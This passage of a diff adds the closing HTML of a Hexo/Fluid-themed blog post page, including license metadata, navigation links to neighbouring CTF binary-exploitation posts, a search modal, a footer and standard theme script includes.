+          <div>November 4, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/14/ctf-pwn/reallochook/" title="realloc hook">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">realloc hook</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/24/ctf-pwn/Fastbin%20Attack/" title="Fastbin Attack">
+                        <span class="hidden-mobile">Fastbin Attack</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
